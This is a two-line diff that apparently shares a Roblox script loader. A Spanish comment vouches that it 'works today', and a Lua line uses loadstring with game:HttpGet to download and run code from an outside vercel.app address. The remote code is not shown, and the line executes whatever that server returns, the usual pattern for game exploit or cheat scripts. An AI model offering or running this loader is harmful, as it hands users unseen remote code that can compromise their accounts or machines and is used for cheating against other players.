@@ -1,0 +1,2 @@
+@desconocido: es este y funciona hoy
+loadstring(game:HttpGet("https://orrxl4-protector.vercel.app/api/raw?id=m5m372c8"))()
